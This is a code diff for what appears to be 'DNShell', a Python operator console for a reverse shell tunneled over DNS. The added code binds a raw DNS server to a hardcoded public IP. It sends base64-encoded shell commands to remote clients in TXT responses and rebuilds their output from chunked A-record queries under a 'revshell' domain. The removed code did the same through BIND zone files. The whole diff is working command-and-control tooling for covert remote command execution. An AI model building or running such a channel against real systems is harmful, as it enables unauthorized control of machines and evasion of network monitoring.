@@ -6,9 +6,14 @@ import json
 from pprint import pprint
 import readline
 import argparse  # Added argparse module
+import threading
+from dnslib import *
+import socket
+import codecs
+
 
 print("""
-     ______ _   _  _____ _          _ _ 
+     ______ _   _  _____ _          _ _
     |  _  \ \ | |/  ___| |        | | |
     | | | |  \| |\ `--.| |__   ___| | |
     | | | | . ` | `--. \ '_ \ / _ \ | |
@@ -38,6 +43,7 @@ def base64_encode_string(string):
     encoded_string = encoded_bytes.decode("utf-8")
     return encoded_string
 
+
 def restore_case_by_hyphen(encoded_string):
     decoded_string = ""
     i = 0
@@ -53,88 +59,10 @@ def restore_case_by_hyphen(encoded_string):
     return decoded_string
 
 
-
-logfile = "../bind/log/query.log"
-
-with open(logfile, "w") as file:
-    file.truncate()
-
-# Define a regular expression pattern to match the log line
-pattern = r"queries: client @\S+ (\d+\.\d+\.\d+\.\d+)#\d+ \((\S+)\): query: (\S+) (\S+) (\S+) \S+\ \((\d+\.\d+\.\d+\.\d+)\)"
-
-# Start tailing the log file
-queryfile = subprocess.Popen(['tail', '-F', logfile],
-                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
 data = {}
 
 domain = "revshell.dnshell.programm.zip"
-
-
-def getData(code, counter):
-    waitingfordata = True
-    # Loop through the output of tail
-    while waitingfordata:
-        line = queryfile.stdout.readline()
-        if line:
-            # Convert the line to a string using the correct encoding
-            line_str = line.decode()
-
-            # Use the regular expression pattern to extract the relevant information from the log line
-            match = re.findall(pattern, line_str)
-            if match:
-                # Extract the information from the match
-                matches = match[0]
-                query = {
-                    "ip_address": matches[0],
-                    "domain_name": matches[1],
-                    "query_class": matches[3],
-                    "query_type": matches[4],
-                    "domain_parts": matches[1].replace(f".{domain}", "").split(".")
-                }
-                if query["query_type"] == "A" and query["domain_name"].lower().endswith(f"{code}-{counter}.{domain}"):
-                    thisdata = query["domain_parts"]
-
-                    #print(f"New query arrived from {query['ip_address']} for {query['domain_name']}, type: {query['query_type']}, class: {query['query_class']}")
-                    #print(f"--- Recieved packet {thisdata[1]} of {thisdata[2]}")
-
-                    if not thisdata[3] in data:
-                        data[thisdata[3]] = {}
-                    data[thisdata[3]][int(thisdata[1])
-                                      ] = thisdata[0].replace("_", "=")
-
-                    print_progress(len(data[thisdata[3]]), int(thisdata[2]), prefix='Progress:', suffix='Complete', bar_length=50)
-                    if len(data[thisdata[3]]) == int(thisdata[2]):                       
-                        #print("--------------------- Data recieved ---------------------")
-                        # Put the data together in one variable
-                        datastring = ""
-                        for i in range(0, int(thisdata[2])):
-                            datastring += data[thisdata[3]][i]
-
-                        # Lower because anti dns caching messed up the cases
-                        datastring = datastring.lower()
-
-                        print(f"Base64 with hyphens: {datastring}")
-                        # For every letter in the string, if there is a hyphen in front of it, change it to upper case
-                        datastring = restore_case_by_hyphen(datastring)
-
-                        print(f"Base64: {datastring}")
-
-                        # base64 decode
-                        decoded = base64_decode_string(datastring)
-                        # JSON decode
-                        #print(f"JSON: {decoded}")
-                        response = json.loads(decoded)
-                        return response
-                        waitingfordata = False
-
-                    # else:
-                        #print(f"--- Still missing {int(thisdata[2]) - len(data[thisdata[3]])} packets")
-
-                # else:
-                    #print(f"--- Ignoring query from {query['ip_address']} for {query['domain_name']}, type: {query['query_type']}, class: {query['query_class']}")
-            # else:
-                #print(f"No match {line_str}")
+expose = ("173.212.225.214", 53)
 
 
 def generateClient():
@@ -164,6 +92,84 @@ def generateClient():
     else:
         main()
 
+def parseRequest(request, addr):
+    return {
+            "ip_address": addr[0],
+            "domain_name": str(request.q.qname),
+            "query_class": str(request.q.qclass),
+            "query_type": QTYPE[request.q.qtype],
+            "domain_parts": str(request.q.qname).replace(f".{domain}", "").split(".")
+    }
+
+def sendData(code,counter,command):
+    #print("func: SendData")
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.bind(expose)
+    while True:
+        #print("Waiting fo Client to get it's data")
+        rawrequest, addr = s.recvfrom(1024)
+        request = DNSRecord.parse(rawrequest)
+        query = parseRequest(request, addr)
+        if(query["query_type"] == "TXT" and query["domain_name"] == f"{counter}.{code}.{domain}."):
+            # Build response with command
+            command = base64_encode_string(command)
+            response = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+            TTL = 60 * 5
+            rdata = TXT(command.encode("utf-8"))
+            response.add_answer(RR(rname=request.q.qname, rtype=QTYPE.TXT, rclass=1, ttl=TTL, rdata=rdata))
+            s.sendto(b'%s' % response.pack(), addr)
+            return;
+
+
+def getData(code,counter):
+    #print("func: GetData")
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.bind(expose)
+    while True:
+        rawrequest, addr = s.recvfrom(1024)
+        request = DNSRecord.parse(rawrequest)
+        query = parseRequest(request, addr)
+        #print(f"Request from: {query['ip_address']} for {query['domain_name']} type {query['query_type']}")
+        if query["query_type"] == "A" and query["domain_name"].lower().endswith(f"{code}-{counter}.{domain}."):
+            thisdata = query["domain_parts"]
+
+            if not thisdata[3] in data:
+                data[thisdata[3]] = {}
+            data[thisdata[3]][int(thisdata[1])
+                                ] = thisdata[0].replace("_", "=")
+
+            print_progress(len(data[thisdata[3]]), int(thisdata[2]), prefix='Progress:', suffix='Complete', bar_length=50)
+            if len(data[thisdata[3]]) == int(thisdata[2]):
+                #print("--------------------- Data recieved ---------------------")
+                # Put the data together in one variable
+                datastring = ""
+                for i in range(0, int(thisdata[2])):
+                    datastring += data[thisdata[3]][i]
+
+                # Lower because anti dns caching messed up the cases
+                datastring = datastring.lower()
+
+                #print(f"Base64 with hyphens: {datastring}")
+                # For every letter in the string, if there is a hyphen in front of it, change it to upper case
+                datastring = restore_case_by_hyphen(datastring)
+
+                #print(f"Base64: {datastring}")
+
+                # base64 decode
+                decoded = base64_decode_string(datastring)
+                # JSON decode
+                #print(f"JSON: {decoded}")
+                response = json.loads(decoded)
+                return response
+            
+            response = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+            TTL = 60 * 5
+            rdata = A("1.1.1.1")
+            #response.add_answer(RR(rname=request.q.qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=rdata))
+            
+            s.sendto(b'%s' % response.pack(), addr)
+        #else:
+            #print("No valid request")
 
 def main():
     parser = argparse.ArgumentParser()
@@ -193,9 +199,6 @@ def main():
         print("----------------------------------------------------------------")
         print("")
 
-        filename = f"../bind/data/zones/{domain}.zone"
-        preset = f"../bind/data/zones/{domain}.preset"
-
         command = ""
         counter = 0
         while command != "exit":
@@ -203,17 +206,7 @@ def main():
 
             readline.add_history(command)
 
-            command = base64_encode_string(command)
-
-            zone = open(filename, "a")
-            zone.write(
-                f"""{counter}.{code}       IN      TXT      {command}\n""")
-            zone.close()
-
-            reloadrnc = 'docker-compose -f "../docker-compose.yml" exec bind9 rndc reload'
-            subprocess.run(reloadrnc, shell=True,
-                           stdout=subprocess.DEVNULL,
-                           stderr=subprocess.STDOUT)
+            sendData(code,counter,command)
 
             if command != "exit":
                 response = getData(code, counter)
@@ -244,7 +237,7 @@ def print_progress(iteration, total, prefix='', suffix='', decimals=1, bar_lengt
     bar = '█' * filled_length + '-' * (bar_length - filled_length)
 
     if iteration == total:
-        # Remove progress bar 
+        # Remove progress bar
         sys.stdout.write('\x1b[2K')
     else:
         sys.stdout.write('\r%s |%s| %s%s %s' %
